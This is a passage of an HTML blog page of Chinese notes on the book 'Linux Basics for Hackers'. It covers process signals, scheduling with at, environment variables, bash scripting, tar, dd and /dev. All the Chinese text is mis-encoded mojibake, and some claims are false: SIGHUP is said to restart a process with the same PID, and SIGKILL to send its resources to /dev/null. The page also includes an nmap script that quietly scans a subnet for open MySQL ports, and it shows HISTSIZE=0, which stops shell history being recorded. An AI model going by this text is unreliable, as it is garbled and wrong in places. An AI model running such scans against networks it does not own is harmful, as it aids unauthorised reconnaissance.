ä¼˜å…ˆçº§ï¼Œä½†ä¸èƒ½å¢åŠ å…¶ä¼˜å…ˆçº§ã€‚å½“ç„¶ï¼Œè¶…çº§ç”¨æˆ·æˆ–æ ¹ç”¨æˆ·å¯ä»¥éšæ„å°† nice å€¼è®¾ç½®ä¸ºä»–ä»¬å–œæ¬¢çš„ä»»ä½•å€¼ã€‚ </p><h3 id="renice"><a href="#renice" class="headerlink" title="renice"></a>renice</h3><p>ä¾‹ï¼šrenice  20  [PID]6996             </p><p>ä¸ nice ä¸€æ ·ï¼Œåªæœ‰ root ç”¨æˆ·å¯ä»¥å°†è¿›ç¨‹é‡æ–°è®¾ç½®ä¸ºè´Ÿå€¼ä»¥èµ‹äºˆå…¶æ›´é«˜çš„ä¼˜å…ˆçº§ï¼Œä½†ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ ç”¨ renice æ¥é™ä½ä¼˜å…ˆçº§ã€‚ </p><h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>å‘½ä»¤ï¼škill -signal PID</p><p>SIGHUP 1<br>è¿™ç§°ä¸ºæŒ‚èµ·ï¼ˆHUPï¼‰æ ‡å¿—ä¿¡å·ã€‚å®ƒä¼šåœ æ­¢æŒ‡å®šçš„è¿›ç¨‹å¹¶ä½¿ç”¨ç›¸åŒçš„PIDé‡æ–°å¯ åŠ¨å®ƒã€‚<br>SIGINT 2<br>è¿™æ˜¯ä¸­æ–­ï¼ˆINTï¼‰ä¿¡å·ã€‚è¿™æ˜¯ä¸€ä¸ªå¼±ä¿¡ å·ï¼Œä¸èƒ½ä¿è¯å·¥ä½œï¼Œä½†å®ƒåœ¨å¤§å¤šæ•°æƒ… å†µä¸‹éƒ½æœ‰æ•ˆã€‚<br>SIGQUIT 3<br>è¿™ç§°ä¸ºæ ¸å¿ƒè½¬å‚¨ã€‚å®ƒç»ˆæ­¢è¿›ç¨‹å¹¶å°†è¿› ç¨‹ä¿¡æ¯ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œç„¶åå°†æ­¤ä¿¡æ¯ ä¿å­˜åœ¨å½“å‰å·¥ä½œç›®å½•ä¸­çš„ä¸€ä¸ªåä¸º core çš„æ–‡ä»¶ä¸­ã€‚ï¼ˆè¿™æ ·åšçš„åŸå› è¶…å‡º äº†æœ¬ä¹¦çš„èŒƒå›´ã€‚ï¼‰<br>SIGTERM 15<br>è¿™æ˜¯ç»ˆæ­¢ï¼ˆTERMï¼‰ä¿¡å·ã€‚è¿™æ˜¯ kill å‘½ä»¤çš„é»˜è®¤ kill ä¿¡å·ã€‚<br>SIGKILL 9<br>è¿™æ˜¯å¼ºåˆ¶ç»ˆæ­¢ä¿¡å·ã€‚å®ƒé€šè¿‡å°†è¿›ç¨‹çš„ èµ„æºå‘é€åˆ°ç‰¹æ®Šä½ç½®/dev/null æ¥å¼º åˆ¶è¿›ç¨‹åœæ­¢ã€‚<br>ä½¿</p><p>å¦‚æœæ‚¨ä¸çŸ¥é“è¿›ç¨‹çš„ PIDï¼Œåˆ™å¯ä»¥ä½¿ç”¨ killall å‘½ä»¤ç»ˆæ­¢è¿›ç¨‹ã€‚æ­¤å‘½ä»¤å°†è¿›ç¨‹çš„åç§°ï¼ˆè€Œä¸æ˜¯ PIDï¼‰ä½œä¸ºå‚ æ•°ã€‚</p><h3 id="åœ¨åå°è¿è¡Œè¿›ç¨‹"><a href="#åœ¨åå°è¿è¡Œè¿›ç¨‹" class="headerlink" title="åœ¨åå°è¿è¡Œè¿›ç¨‹"></a>åœ¨åå°è¿è¡Œè¿›ç¨‹</h3><p>è¦åœ¨åå°å¯åŠ¨è¿›ç¨‹ï¼Œåªéœ€åœ¨å‘½ä»¤æœ«å°¾æ·»åŠ ä¸€ä¸ªä¸å·ï¼ˆï¼†ï¼‰ï¼Œ</p><p>ä¾‹:    leafpad  newscript  &amp; </p><h3 id="æŠŠåå°è¿è¡Œçš„è¿›ç¨‹ç§»åˆ°å‰å°"><a href="#æŠŠåå°è¿è¡Œçš„è¿›ç¨‹ç§»åˆ°å‰å°" class="headerlink" title="æŠŠåå°è¿è¡Œçš„è¿›ç¨‹ç§»åˆ°å‰å°"></a>æŠŠåå°è¿è¡Œçš„è¿›ç¨‹ç§»åˆ°å‰å°</h3><p>å‘½ä»¤ï¼šfg PID</p><h3 id="å®šæ—¶æ‰§è¡Œç¨‹åº"><a href="#å®šæ—¶æ‰§è¡Œç¨‹åº" class="headerlink" title="å®šæ—¶æ‰§è¡Œç¨‹åº"></a>å®šæ—¶æ‰§è¡Œç¨‹åº</h3><p><strong>at</strong></p><p>å½“æ‚¨ä½¿ç”¨æŒ‡å®šçš„æ—¶é—´è¿›å…¥ at å®ˆæŠ¤è¿›ç¨‹æ—¶ï¼Œè¿›å…¥äº¤äº’æ¨¡å¼æ—¶ï¼Œæ‚¨ä¼šçœ‹åˆ° at&gt;æç¤ºç¬¦ã€‚æ‚¨å¯ä»¥åœ¨æ­¤å¤„è¾“å…¥ è¦åœ¨æŒ‡å®šæ—¶é—´æ‰§è¡Œçš„å‘½ä»¤ï¼š </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="keyword">at</span>  <span class="number">7</span>:<span class="number">20</span>am </span><br><span class="line"><span class="keyword">at</span> &gt;/root/myscanningscript</span><br></pre></td></tr></table></figure><p>at å‘½ä»¤æ˜¯å®ˆæŠ¤è¿›ç¨‹ï¼ˆåå°è¿›ç¨‹ï¼‰å¯¹äºå°†ä½œä¸šå®‰æ’åœ¨å°†æ¥çš„æŸä¸ªæ—¶åˆ»è¿è¡Œä¸€æ¬¡éå¸¸æœ‰ç”¨ã€‚</p><p>crond æ›´é€‚åˆäº å®‰æ’ä»»åŠ¡æ¯å¤©ï¼Œæ¯å‘¨æˆ–æ¯æœˆå‘ç”Ÿã€‚</p><h3 id="ç®¡ç†ç”¨æˆ·ç¯å¢ƒå˜é‡"><a href="#ç®¡ç†ç”¨æˆ·ç¯å¢ƒå˜é‡" class="headerlink" title="ç®¡ç†ç”¨æˆ·ç¯å¢ƒå˜é‡"></a>ç®¡ç†ç”¨æˆ·ç¯å¢ƒå˜é‡</h3><p>env    æŸ¥çœ‹æ‰€æœ‰é»˜è®¤ç¯å¢ƒå˜é‡</p><p>set | more     è¦æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬ shell å˜é‡ã€æœ¬åœ°å˜é‡å’Œ shell å‡½æ•°(å¦‚ä»»ä½•ç”¨æˆ·å®šä¹‰çš„å˜é‡å’Œå‘½ä»¤åˆ«å)</p><p>set | grep HISTSIZE     ç‰¹å®šå˜é‡çš„è¿‡æ»¤</p><p>HISTSIZE=0     æš‚æ—¶æ›´æ”¹ä¼šè¯çš„å˜é‡å€¼</p><p>export HISTSIZE     æ°¸ä¹…æ›´æ”¹ä¼šè¯çš„å˜é‡å€¼ï¼ˆæ›´æ”¹å exportï¼‰</p><p>æ‰¾ç‚¹ä¹å­ï¼š</p><p>â€‹        PS1=â€Worldâ€™s Best Hacker: #â€ </p><p>â€‹        export PS1 </p><p>PS1 å˜é‡æœ‰ä¸€ç»„å ä½ç¬¦ï¼Œç”¨äºæ˜¾ç¤ºå¸Œ æœ›åœ¨æç¤ºç¬¦ä¸­æ˜¾ç¤ºçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä»¥ä¸‹å†…å®¹: \u  å½“å‰ç”¨æˆ·çš„åç§° \h  ä¸»æœºå \W  å½“å‰å·¥ä½œç›®å½•çš„åŸºæœ¬åç§° </p><h3 id="æ·»åŠ åˆ°PATHå˜é‡"><a href="#æ·»åŠ åˆ°PATHå˜é‡" class="headerlink" title="æ·»åŠ åˆ°PATHå˜é‡"></a>æ·»åŠ åˆ°PATHå˜é‡</h3><p>PATH=$PATH:/root/newhackingtool </p><h3 id="åˆ›å»ºç”¨æˆ·å®šä¹‰çš„å˜é‡"><a href="#åˆ›å»ºç”¨æˆ·å®šä¹‰çš„å˜é‡" class="headerlink" title="åˆ›å»ºç”¨æˆ·å®šä¹‰çš„å˜é‡"></a>åˆ›å»ºç”¨æˆ·å®šä¹‰çš„å˜é‡</h3><p>è¯­æ³•å¾ˆç®€å•ï¼šè¾“å…¥å˜é‡çš„åç§°ï¼Œåé¢è·Ÿç€èµ‹å€¼ç¬¦å·(=)ï¼Œç„¶åè¾“å…¥å˜é‡çš„å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤º: </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;MYNEWVARIABLE=<span class="comment">"Hacking is the most valuable skill set in the 21st century</span></span><br><span class="line">kali &gt;<span class="keyword">echo</span> $MYNEWVARIABLE </span><br><span class="line">Hacking <span class="keyword">is</span> the most valuable skill <span class="keyword">set</span> in the <span class="number">21</span><span class="keyword">st</span> century</span><br></pre></td></tr></table></figure><p>å°±åƒæˆ‘ä»¬çš„ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸€æ ·ï¼Œå¿…é¡»å¯¼å‡ºç”¨æˆ·å®šä¹‰çš„å˜é‡æ‰èƒ½å°†å…¶æŒä¹…åŒ–åˆ°æ–°çš„ä¼šè¯ä¸­ã€‚ </p><p>å¦‚æœè¦åˆ é™¤è¿™ä¸ªæ–°å˜é‡æˆ–ä»»ä½•å˜é‡ï¼Œè¯·ä½¿ç”¨ unset å‘½ä»¤ã€‚ä¸è¿‡ï¼Œåœ¨åˆ é™¤ç³»ç»Ÿå˜é‡ä¹‹å‰ä¸€å®šè¦ä¸‰æ€ï¼Œå›  ä¸ºä¹‹åç³»ç»Ÿçš„æ“ä½œå¯èƒ½ä¼šå¤§ä¸ç›¸åŒã€‚ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="built_in">unset</span> MYNEWVARIABLE </span><br><span class="line">kali &gt;<span class="built_in">echo</span> <span class="variable">$MYNEWVARIABLE</span> </span><br><span class="line">kali &gt;</span><br></pre></td></tr></table></figure><p>å¦‚æ‚¨æ‰€è§ï¼Œå½“æ‚¨è¾“å…¥ unset  MYNEWVARIABLE æ—¶ï¼Œæ‚¨å°†åˆ é™¤è¯¥å˜é‡åŠå…¶å€¼ã€‚å¦‚æœåœ¨åŒä¸€ä¸ªå˜é‡ä¸Šä½¿ç”¨ echoï¼ŒLinux ç°åœ¨å°†è¿”å›ç©ºè¡Œã€‚</p><h2 id="ç®€å•BASH-è„šæœ¬ç¼–ç¨‹"><a href="#ç®€å•BASH-è„šæœ¬ç¼–ç¨‹" class="headerlink" title="ç®€å•BASH è„šæœ¬ç¼–ç¨‹"></a>ç®€å•BASH è„šæœ¬ç¼–ç¨‹</h2><p>#!        å‘Šè¯‰æ‚¨çš„æ“ä½œç³»ç»Ÿæ‚¨æƒ³ä¸ºè„šæœ¬ä½¿ç”¨å“ªä¸ªè§£é‡Šå™¨ã€‚</p><p>ç„¶åæŒ‰ç…§æŒ‡ç¤ºçš„ (#!/bin/bash)æ“ä½œç³»ç»Ÿä½¿ç”¨ bash shell è§£é‡Šå™¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">âŠ <span class="comment">#! /bin/bash </span></span><br><span class="line"> </span><br><span class="line">â‹ <span class="comment"># This is your second bash script. In this one, you prompt /  </span></span><br><span class="line"><span class="comment"># the user for input, place the input in a variable, and / </span></span><br><span class="line"><span class="comment"># display the variable contents in a string. </span></span><br><span class="line"> </span><br><span class="line">âŒ <span class="built_in">echo</span> <span class="string">"What is your name?"</span>  </span><br><span class="line"><span class="built_in">read</span> name </span><br><span class="line">â <span class="built_in">echo</span> <span class="string">"What chapter are you on in Linux Basics for Hackers?"</span>  </span><br><span class="line"><span class="built_in">read</span> chapter </span><br><span class="line">â <span class="built_in">echo</span> <span class="string">"Welcome"</span> <span class="variable">$name</span> <span class="string">"to Chapter"</span> <span class="variable">$chapter</span> <span class="string">"of Linux Basics for Hackers!"</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»#!/bin/bash å¼€å§‹ï¼Œå‘Šè¯‰ç³»ç»Ÿè¦ä½¿ç”¨è¿™ä¸ªè„šæœ¬âŠbash è§£é‡Šå™¨ã€‚ç„¶åæ·»åŠ ä¸€ä¸ªæ³¨é‡Šæè¿°è„šæœ¬â‹åŠå…¶ åŠŸèƒ½ã€‚ä¹‹å,æˆ‘ä»¬æç¤ºç”¨æˆ·è¾“å…¥ä»–ä»¬çš„åå­—ï¼ŒâŒé—®è§£é‡Šå™¨æˆ‘ä»¬çš„åå­—ï¼Œè¯»å–è¾“å…¥å¹¶å°†å…¶è½¬æ¢æˆä¸€ä¸ªå˜é‡ nameã€‚ ç„¶åæˆ‘ä»¬æç¤ºç”¨æˆ·è¾“å…¥ä»–ä»¬ç›®å‰æ­£åœ¨è¿™æœ¬ä¹¦ä¸­çš„æ‰€åœ¨ç« èŠ‚ï¼Œâæˆ‘ä»¬å†æ¬¡è¯»å–é”®ç›˜è¾“å…¥ä¸€ä¸ªå˜é‡ï¼Œè¿™ä¸ªç« èŠ‚ å« chapterã€‚<br>åœ¨æœ€åä¸€è¡Œä¸­ï¼Œæˆ‘ä»¬æ„é€ ä¸€ä¸ªè¾“å‡ºå­—ç¬¦ä¸²ï¼Œâæ¬¢è¿è¯»è€…ï¼ˆä»–ä»¬çš„åå­—ï¼‰åœ¨æ­¤ä¹¦çš„æ‰€åœ¨ç« èŠ‚ã€‚æˆ‘ä»¬ä½¿ç”¨ echo å‘½ä»¤ï¼Œå¹¶ç”¨åŒå¼•å·æä¾›è¦åœ¨å±å¹•ä¸Šæ˜¾ç¤ºçš„æ–‡æœ¬ã€‚ç„¶åï¼Œä¸ºäº†å¡«å†™ç”¨æˆ·è¾“å…¥çš„åç§°å’Œç« å·ï¼Œæˆ‘ä»¬å°†å˜é‡ æ·»åŠ åˆ°æ¶ˆæ¯ä¸­åº”è¯¥å‡ºç°çš„ä½ç½®ã€‚å¦‚ç¬¬ 7 ç« æ‰€è¿°ï¼Œè¦ä½¿ç”¨å˜é‡ä¸­åŒ…å«çš„å€¼ï¼Œå¿…é¡»åœ¨å˜é‡åå‰é¢åŠ ä¸Š$ç¬¦å·ã€‚<br>å°†æ­¤æ–‡ä»¶ä¿å­˜ä¸º WelcomeScript.sh æ–‡ä»¶ã€‚å…¶ä¸­.sh æ‰©å±•åæ˜¯è„šæœ¬æ–‡ä»¶çš„çº¦å®šã€‚æ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬ æ²¡æœ‰åŒ…å«å‰é¢çš„æ‰©å±•åï¼Œè¿™å¹¶ä¸æ˜¯ä¸¥æ ¼è¦æ±‚çš„ï¼Œå¦‚æœæ‚¨å…³é—­æ‰©å±•åï¼Œè¯¥æ–‡ä»¶å°†é»˜è®¤ä¿å­˜ä¸º shell è„šæœ¬æ–‡ä»¶ã€‚<br>ç°åœ¨ï¼Œè®©æˆ‘ä»¬è¿è¡Œè¿™ä¸ªè„šæœ¬ã€‚ä¸è¦å¿˜è®°å…ˆç”¨ chmod ç»™å…¶æ‰§è¡Œæƒé™</p><p>nmap:</p><p>nmap  -sT  192.168.181.1  -p  3306     å¯¹åœ°å€ 192.168.181.1 æ‰§è¡Œ TCP æ‰«æï¼ŒæŸ¥çœ‹ç«¯å£ 3306 (MySQL çš„é»˜è®¤ç«¯å£)æ˜¯å¦æ‰“å¼€ï¼Œ </p><h3 id="ä¸€ä¸ªç®€å•çš„æ‰«æå™¨"><a href="#ä¸€ä¸ªç®€å•çš„æ‰«æå™¨" class="headerlink" title="ä¸€ä¸ªç®€å•çš„æ‰«æå™¨"></a>ä¸€ä¸ªç®€å•çš„æ‰«æå™¨</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âŠ #! /bin/bash </span><br><span class="line">â‹ # This<span class="built_in"> script </span>is designed <span class="keyword">to</span> <span class="builtin-name">find</span> hosts with MySQL installed </span><br><span class="line">nmap âŒ-sT 192.168.181.0/24 â-p 3306 â&gt;/dev/<span class="literal">null</span> â-oG MySQLscan </span><br><span class="line">â cat MySQLscan | grep open &gt; MySQLscan2 â‘ </span><br><span class="line"> </span><br><span class="line">cat MySQLscan2</span><br></pre></td></tr></table></figure><p>âŠæˆ‘ä»¬ä½¿ç”¨æ ‡è¯†ç¬¦#ï¼å¼€å§‹ã€‚â‹è®©æˆ‘ä»¬éµå¾ªè¿™ä¸ªæ³¨é‡Šæ¥è§£é‡Šè„šæœ¬çš„ç”¨é€”ã€‚<br>ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨âŒnmap å‘½ä»¤ TCP æ‰«æå±€åŸŸç½‘ï¼Œå¯»æ‰¾ç«¯å£ 3306âã€‚(è¯·æ³¨æ„ï¼Œæ‚¨çš„ IP åœ°å€åœ¨æ‚¨çš„ç»ˆç«¯ ä¸­å¯èƒ½ä¸åŒï¼Œè¯·ä½¿ç”¨ Linux ä¸Šçš„ ifconfig å‘½ä»¤æˆ– Windows ä¸Šçš„ ipconfig å‘½ä»¤æ¥ç¡®å®šæ‚¨çš„ IP åœ°å€ã€‚) ä¸ºäº†ä¿æŒ éšç§˜ï¼Œæˆ‘ä»¬è¿˜å‘é€é€šå¸¸ä¼šå‡ºç°åœ¨å±å¹•ä¸Šçš„æ ‡å‡† nmap è¾“å‡ºåˆ° Linux çš„ä¸€ä¸ªç‰¹æ®Šçš„åœ°æ–¹âï¼Œä¸€ä¸ªç‰¹æ®Šçš„åœ°æ–¹åœ¨ Linux ä¸­æ¶ˆå¤±ã€‚æˆ‘ä»¬åœ¨æœ¬åœ°æœºå™¨ä¸Šåšè¿™ä¸ªï¼Œæ‰€ä»¥è¿™å¹¶ä¸é‡è¦ï¼Œä½†å¦‚æœè¦è¿œç¨‹ä½¿ç”¨è„šæœ¬ï¼Œåˆ™éœ€è¦éšè— nmap è¾“ å‡ºã€‚ç„¶åï¼Œæˆ‘ä»¬å°†æ‰«æçš„è¾“å‡ºå‘é€åˆ°ä¸€ä¸ªåä¸º MySQLscan çš„æ–‡ä»¶âï¼Œæ ¼å¼ä¸º grep æ ¼å¼ï¼Œè¿™æ„å‘³ç€ grep å¯ä»¥ å¤„ç†çš„æ ¼å¼ã€‚ </p><p>ä¸‹ä¸€è¡Œæ˜¾ç¤ºæˆ‘ä»¬å­˜å‚¨è¾“å‡ºçš„ MySQLscan æ–‡ä»¶ï¼Œâç„¶åè¾“å‡ºåˆ° grep çš„ç®¡é“ï¼Œä»¥è¿‡æ»¤åŒ…å«å…³é”®å­— openï¼ˆç«¯ å£å¼€æ”¾ï¼‰çš„æ‰€åœ¨è¡Œã€‚ç„¶åæˆ‘ä»¬æŠŠè¿™äº›å­—ç¬¦è¡Œæ”¾åˆ°ä¸€ä¸ªå‘½åä¸º MySQLscan2 çš„æ–‡ä»¶ä¸­â‘ã€‚ </p><h4 id="æ³¨ï¼šè¿™é‡Œåªå¯¹bashè¿›è¡Œç®€å•çš„ä»‹ç»ã€‚"><a href="#æ³¨ï¼šè¿™é‡Œåªå¯¹bashè¿›è¡Œç®€å•çš„ä»‹ç»ã€‚" class="headerlink" title="æ³¨ï¼šè¿™é‡Œåªå¯¹bashè¿›è¡Œç®€å•çš„ä»‹ç»ã€‚"></a>æ³¨ï¼šè¿™é‡Œåªå¯¹bashè¿›è¡Œç®€å•çš„ä»‹ç»ã€‚</h4><p>å†…ç½® Bash å‘½ä»¤<br>å‘½ä»¤    åŠŸèƒ½<br>ï¼š     è¿”å› 0 æˆ– true<br>.     æ‰§è¡Œ shell è„šæœ¬<br>b     å°†ä½œä¸šæ”¾åœ¨åå°<br>break     é€€å‡ºå½“å‰å¾ªç¯<br>cd     æ”¹å˜ç›®å½•<br>continue     æ‰§è¡Œå½“å‰å¾ªç¯<br>echo     æ˜¾ç¤ºå‘½ä»¤å‚æ•°<br>eval     è®¡ç®—ä»¥ä¸‹è¡¨è¾¾å¼<br>exec     åœ¨ä¸åˆ›å»ºæ–°è¿›ç¨‹çš„æƒ…å†µä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤<br>exit     é€€å‡º shell<br>export     ä½¿å˜é‡æˆ–å‡½æ•°å¯¹å…¶ä»–ç¨‹åºå¯ç”¨<br>fg     å°†å·¥ä½œæ”¾åœ¨å‰å°<br>getopts     è§£æ shell è„šæœ¬çš„å‚æ•°<br>jobs     åˆ—å‡ºåå°(bg)æ‰§è¡Œçš„å·¥ä½œ<br>Pwd     æ˜¾ç¤ºå½“å‰ç›®å½•<br>Read     ä»æ ‡å‡†è¾“å…¥è¯»å–ä¸€è¡Œ<br>Readonly     å°†å˜é‡å£°æ˜ä¸ºåªè¯»<br>set     åˆ—å‡ºæ‰€æœ‰å˜é‡<br>shift     å°†å‚æ•°å‘å·¦ç§»åŠ¨<br>test     è¯„ä¼°å‚æ•°<br>[     æ‰§è¡Œæ¡ä»¶æµ‹è¯•<br>times     æ‰“å°ç”¨æˆ·å’Œç³»ç»Ÿæ—¶é—´<br>trap     è¿½è¸ªä¸€ä¸ªä¿¡å·<br>type     æ˜¾ç¤ºå¦‚ä½•å°†æ¯ä¸ªå‚æ•°è§£é‡Šä¸ºä¸€ä¸ªå‘½ä»¤<br>umask     æ›´æ”¹æ–°æ–‡ä»¶çš„é»˜è®¤æƒé™<br>unset     ä»å˜é‡æˆ–å‡½æ•°ä¸­åˆ é™¤å€¼<br>wait     ç­‰å¾…åå°è¿›ç¨‹å®Œæˆ</p><h2 id="å‹ç¼©å’Œå½’æ¡£"><a href="#å‹ç¼©å’Œå½’æ¡£" class="headerlink" title="å‹ç¼©å’Œå½’æ¡£"></a>å‹ç¼©å’Œå½’æ¡£</h2><h3 id="å½’æ¡£"><a href="#å½’æ¡£" class="headerlink" title="å½’æ¡£"></a>å½’æ¡£</h3><p>tar  -cvf  HackersArise.tar  hackersarise1  hackersarise2  hackersarise3 </p><p>å½’æ¡£å‘½ä»¤æ˜¯ tarï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä½¿ç”¨å®ƒæœ‰ä¸‰ä¸ªå‚æ•°é€‰é¡¹ã€‚c é€‰é¡¹è¡¨ ç¤ºåˆ›å»ºï¼Œv(ä»£è¡¨è¯¦ç»†è¿‡ç¨‹ï¼Œæ˜¯å¯é€‰çš„)åˆ—å‡º tar æ­£åœ¨å¤„ç†çš„æ–‡ä»¶ï¼Œf è¡¨ç¤ºå†™å…¥ä»¥ä¸‹ä¸€ä¸ªæ–‡ä»¶ã€‚æœ€åä¸€ä¸ªé€‰é¡¹ä¹Ÿ é€‚ç”¨äºä»æ–‡ä»¶ä¸­è¯»å–ã€‚ç„¶åï¼Œæˆ‘ä»¬ä¸ºæ–°å½’æ¡£æ–‡ä»¶æä¾›æ‚¨å¸Œæœ›ä»è¿™ä¸‰ä¸ªè„šæœ¬æ¥åˆ›å»ºçš„æ–‡ä»¶å:HackersArise.tarã€‚</p><p>tar  -tvf  HackersArise.tar         ä½¿ç”¨ tar å‘½ä»¤å’Œ-t å†…å®¹åˆ—è¡¨å‚æ•°ä» tar åŒ…ä¸­æ˜¾ç¤ºè¿™äº›æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦æå–å®ƒä»¬ï¼Œ</p><p>tar  -xvf  HackersArise.tar         ä½¿ç”¨ tar å‘½ä»¤å’Œ-x (extract)é€‰é¡¹ä» tar åŒ…ä¸­æå–è¿™äº›æ–‡ä»¶</p><h3 id="å‹ç¼©"><a href="#å‹ç¼©" class="headerlink" title="å‹ç¼©"></a>å‹ç¼©</h3><p>â€‹                        </p><table><thead><tr><th>å‹ç¼©æ–¹å¼</th><th>å‹ç¼©æ–‡ä»¶</th><th>è§£å‹æ–‡ä»¶</th></tr></thead><tbody><tr><td>â€¢ bzip2ï¼Œå®ƒä½¿ç”¨æ‰©å±•å.tar.bz2</td><td>bzip2  HackersArise.*</td><td>bunzip2  HackersArise.*</td></tr><tr><td>â€¢ compressï¼Œå®ƒä½¿ç”¨æ‰©å±•å.tar.Z</td><td>compress  HackersArise.*</td><td>uncompress  HackersArise.*</td></tr><tr><td>â€¢ gzipï¼Œå®ƒä½¿ç”¨æ‰©å±•å.tar.gz æˆ–.tgz</td><td>gzip  HackersArise.*</td><td>gunzip  HackersArise.*</td></tr></tbody></table><h3 id="åˆ›å»ºå­˜å‚¨è®¾å¤‡çš„é€ä½æˆ–ç‰©ç†å‰¯æœ¬"><a href="#åˆ›å»ºå­˜å‚¨è®¾å¤‡çš„é€ä½æˆ–ç‰©ç†å‰¯æœ¬" class="headerlink" title="åˆ›å»ºå­˜å‚¨è®¾å¤‡çš„é€ä½æˆ–ç‰©ç†å‰¯æœ¬"></a>åˆ›å»ºå­˜å‚¨è®¾å¤‡çš„é€ä½æˆ–ç‰©ç†å‰¯æœ¬</h3><p>dd å‘½ä»¤çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹: </p><p>dd if=inputfile of=outputfile </p><p>dd æ˜¯æŒ‡å®šè¾“å…¥æ–‡ä»¶çš„ç‰©ç†â€œå¤åˆ¶â€å‘½ä»¤ï¼Œ</p><p>/dev/sdb è¡¨ç¤ºæŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„/dev ç›®å½•ä¸‹çš„é—ªå­˜é©±åŠ¨å™¨ï¼Œ</p><p>/root/flashcopy æ˜¯è¦å°†ç‰©ç†å‰¯æœ¬å¤åˆ¶åˆ°çš„æ–‡ä»¶çš„åç§°</p><p>dd  if=/dev/media  of=/root/flashcopy  bs=4096  conv:noerror</p><p>dd å‘½ä»¤å¯ä»¥ä½¿ç”¨è®¸å¤šå‚æ•°é€‰é¡¹ï¼Œæ‚¨å¯ä»¥å¯¹è¿™äº›é€‰é¡¹è¿›è¡Œä¸€äº›ç ”ç©¶ï¼Œä½†å…¶ä¸­æœ€æœ‰ç”¨çš„æ˜¯ noerror é€‰é¡¹å’Œ bs(å—å¤§å°)é€‰é¡¹ã€‚é¡¾åæ€ä¹‰ï¼Œå³ä½¿é‡åˆ°é”™è¯¯ï¼Œnoerror é€‰é¡¹ä¹Ÿä¼šç»§ç»­å¤åˆ¶ã€‚bs é€‰é¡¹å…è®¸æ‚¨ç¡®å®šè¦å¤åˆ¶çš„æ•° æ®çš„å—å¤§å°(æ¯ä¸ªå—çš„è¯»/å†™å­—èŠ‚æ•°)ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒè¢«è®¾ç½®ä¸º 512 å­—èŠ‚ï¼Œä½†æ˜¯å¯ä»¥æ›´æ”¹å®ƒä»¥åŠ å¿«è¿›åº¦ã€‚é€š å¸¸ï¼Œè¿™å°†è®¾ç½®ä¸ºè®¾å¤‡çš„æ‰‡åŒºå¤§å°ï¼Œé€šå¸¸ä¸º 4KB(4096 å­—èŠ‚)ã€‚</p><h2 id="æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡ç®¡ç†"><a href="#æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡ç®¡ç†" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡ç®¡ç†"></a>æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡ç®¡ç†</h2><h3 id="è®¾å¤‡ç›®å½•-DEV"><a href="#è®¾å¤‡ç›®å½•-DEV" class="headerlink" title="è®¾å¤‡ç›®å½•/DEV"></a>è®¾å¤‡ç›®å½•/DEV</h3><p>Linux æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç›®å½•ï¼Œå…¶ä¸­åŒ…å«ä»£è¡¨æ¯ä¸ªé™„åŠ è®¾å¤‡çš„æ–‡ä»¶ï¼šé€‚å½“å‘½åçš„/dev ç›®å½•ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /dev </span><br><span class="line">kali &gt;ls  -l total<span class="number"> 0 </span></span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,175 May<span class="number"> 16 </span>12:44 agpgart </span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,235 May<span class="number"> 16 </span>12:44 autofs </span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span> root root<span class="number"> 160 </span>May<span class="number"> 16 </span>12:44 block </span><br><span class="line">Â­Â­snip-- </span><br><span class="line">lrwxrwxrwx  <span class="number"> 1 </span> root root<span class="number"> 3 </span>May<span class="number"> 16 </span>12:44 cdrom -&gt; sr0 </span><br><span class="line">Â­Â­snip-- </span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span> root root<span class="number"> 60 </span>May<span class="number"> 16 </span>12:44 cpu </span><br><span 